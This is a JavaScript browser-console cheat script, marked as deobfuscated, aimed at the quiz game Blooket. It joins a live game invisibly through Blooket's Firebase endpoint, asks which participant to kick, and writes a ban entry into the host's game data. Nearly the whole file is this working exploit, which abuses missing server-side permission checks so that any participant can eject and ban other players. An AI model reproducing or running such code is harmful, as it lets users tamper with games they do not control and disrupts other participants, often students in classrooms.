// Deobfuscated by Greenlio#4514

tr = Object.values(document.querySelector('#app > div > div'))[1].children[1][
  '_owner'
].stateNode
var i = document.createElement('iframe')
i.style.display = 'none'
document.body.appendChild(i)
window.console = i.contentWindow.console
window.prompt = i.contentWindow.prompt
var _0x35ebc3 = {
  ['']: (_0x4a7e0e, _0x682a94, _0x5de38b) => {
    _0x682a94.cache = _0x5de38b.c
  },
}
Object.values(webpackJsonp.push([[], _0x35ebc3, [['']]]).cache)
  .find(
    (_0x39fd82) =>
      _0x39fd82.exports && _0x39fd82.exports.a && _0x39fd82.exports.a.put
  )
  .exports.a.put('https://fb.blooket.com/c/firebase/join', {
    id: Object.values(document.querySelector('#app > div > div'))[1]
      .children[1]['_owner'].stateNode.props.client.hostId,
    name: 'Invisible'.concat((Math.random() * 65535) | 0),
  })
  .then(function (_0x312b04) {
    u = prompt(
      'User To Kick: '.concat(
        Object.keys(_0x312b04.data.host.c).toString().replaceAll("'", '')
      )
    )
    if (Object.keys(_0x312b04.data.host.c).includes(u)) {
      tr.state.userToBlock = u
      function _0x5e5b95(_0x148449, _0x3cf0c0, _0x1c17af) {
        var _0x28a49b = {}
        return (
          (_0x28a49b.value = _0x1c17af),
          (_0x28a49b.enumerable = true),
          (_0x28a49b.configurable = true),
          (_0x28a49b.writable = true),
          (_0x3cf0c0 in _0x148449
            ? Object.defineProperty(_0x148449, _0x3cf0c0, _0x28a49b)
            : (_0x148449[_0x3cf0c0] = _0x1c17af),
          _0x148449)
        )
      }
      var _0x3e7f21 = tr.state.userToBlock,
        _0x403955 = JSON.parse(JSON.stringify(tr.state.players)),
        _0x5657f9 = _0x403955
          .map(function (_0x3bfa33) {
            return _0x3bfa33.name
          })
          .indexOf(_0x3e7f21),
        _0x378383 = _0x403955.length
      ;-1 !== _0x5657f9 &&
        ((_0x378383 = _0x403955[_0x5657f9].place),
        _0x403955.splice(_0x5657f9, 1))
      _0x403955 = _0x403955.map(function (_0x3dc147) {
        return _0x5e5b95(
          _0x5e5b95({}, _0x3dc147),
          {},
          {
            place:
              _0x3dc147.place > _0x378383
                ? _0x3dc147.place - 1
                : _0x3dc147.place,
          }
        )
      })
      tr.setState({
        players: _0x403955,
        userToBlock: '',
      })
      tr.props.firebase.setVal(
        {
          id: tr.props.client.hostId,
          path: 'bu/'.concat(_0x3e7f21),
          val: 1,
        },
        function () {
          tr.props.firebase.removeVal(
            tr.props.client.hostId,
            'c/'.concat(_0x3e7f21)
          )
        }
      )
    }
  })
